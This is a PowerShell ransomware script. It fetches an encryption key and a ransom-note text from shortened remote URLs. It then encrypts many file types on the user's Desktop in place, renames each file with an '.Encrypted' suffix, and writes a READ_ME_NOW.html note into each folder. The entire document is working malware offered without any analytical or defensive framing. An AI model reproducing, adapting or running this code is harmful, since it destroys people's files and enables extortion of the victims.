$web = New-Object Net.WebClient
$key = $web.DownloadString("https://goo.gl/drDgnJ")
$text = $web.DownloadString("https://goo.gl/7oKo86")

function Encrypt-File($String, $Passphrase)
{
    $salt="I only need to press one key to run the exploit.";
    $init="Or, I can press another and disable the entire plan.";
    $r = new-Object System.Security.Cryptography.RijndaelManaged
    $pass = [Text.Encoding]::UTF8.GetBytes($Passphrase)
    $salt = [Text.Encoding]::UTF8.GetBytes($salt)

    $r.Key = (new-Object Security.Cryptography.PasswordDeriveBytes $pass, $salt, "SHA1", 10).GetBytes(64) #512/16
    $r.IV = (new-Object Security.Cryptography.SHA1Managed).ComputeHash( [Text.Encoding]::UTF8.GetBytes($init) )[0..15]
   
    $c = $r.CreateEncryptor()
    $ms = new-Object IO.MemoryStream
    $cs = new-Object Security.Cryptography.CryptoStream $ms,$c,"Write"
    $sw = new-Object IO.StreamWriter $cs
    $sw.Write($String)
    $sw.Close()
    $cs.Close()
    $ms.Close()
    $r.Clear()
    return $ms.ToArray()
}

$DesktopPath = [Environment]::GetFolderPath("Desktop")

gci $DesktopPath -Recurse -Include "*.png","*.txt","*.xlsx","*.docx","*.pdf","*.doc","*.mp3","*.wav","*.rar","*.jpeg","*.jpg","*.bmp","*.xls","*.mp4","*.wmv","*.avi","*.mpg","*.ppt","*.pptx","*.csv" | %{

   try{
       $file = Get-Content $_ -raw;
       $encrypt = Encrypt-File $file $key
       Set-Content -Path $_ -Value $encrypt

        $newname=$_.Name+'.Encrypted';
        ren -Path $_.FullName -NewName $newname -Force;

        $path=$_.DirectoryName+'\READ_ME_NOW.html';
        sc -pat $path -va $text
    }
    catch{}
}
